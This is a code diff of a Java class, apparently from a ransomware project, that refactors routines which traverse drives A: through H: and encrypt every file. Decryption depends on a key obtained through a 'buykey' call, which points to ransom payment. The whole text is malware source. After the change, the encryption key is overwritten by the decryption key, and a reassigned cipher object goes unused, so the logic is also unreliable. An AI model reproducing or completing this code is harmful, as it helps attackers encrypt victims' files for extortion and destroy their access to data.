@@ -1,8 +1,8 @@
 package Agent.Attack;
 
 import java.io.File;
-import java.util.ArrayList;
 import java.util.Collection;
+import java.util.Collections;
 import java.util.Map;
 
 import Agent.EncryptionAlgo.CryptoAlgorithm;
@@ -15,31 +15,47 @@ import Agent.traversal.*;
 public class AttackVector {
 
 	private KeyService keyService;
-	private Cryptable cryptFunc;
-	private Collection<File> visitedFolders;
 
-	public void encryptFileSystem() throws RansomwareException {
+	public void attack() throws RansomwareException {
 		Traverse<File> dfs = new DFS<File>();
 		// or
 		Traverse<File> bfs = new BFS<File>();
-		cryptFunc = new EncryptFile();
-		for (char i = 'A'; i <= 'H'; i++) {
 
-			traverseAndCrypt(i + ":\\", visitedFolders, keyService.getKey(), bfs, cryptFunc);
+		Collection<File> visitedFolders = Collections.emptySet();
+
+		// Default
+		Cryptable cryptFunc = new EncryptFile();
+
+		CryptoKey key = encryptionKey();
+		// or
+		key = decryptionKey(cryptFunc);
+		for (char i = 'A'; i <= 'H'; i++) {
+			try {
+				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
+			} catch (RansomwareException e) {
+				throw new RansomwareException(e.getMessage(), e.getCause());
+			}
 
 		}
-
 	}
 
-	public void decryptFileSystem() throws RansomwareException {
-		Traverse<File> dfs = new DFS<File>();
-		// or
-		Traverse<File> bfs = new BFS<File>();
-		cryptFunc = new DecryptFile();
-		for (char i = 'A'; i <= 'H'; i++) {
-			traverseAndCrypt(i + ":\\", visitedFolders, keyService.buykey(), bfs, cryptFunc);
-
+	private CryptoKey encryptionKey() throws RansomwareException {
+		try {
+			return keyService.getKey();
+		} catch (RansomwareException e) {
+			throw new RansomwareException(e.getMessage(), e.getCause());
 		}
+	}
+
+	private CryptoKey decryptionKey(Cryptable cryptFunc) throws RansomwareException {
+
+		cryptFunc = new DecryptFile();
+		try {
+			return keyService.buykey();
+		} catch (RansomwareException e) {
+			throw new RansomwareException(e.getMessage(), e.getCause());
+		}
+
 	}
 
 	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
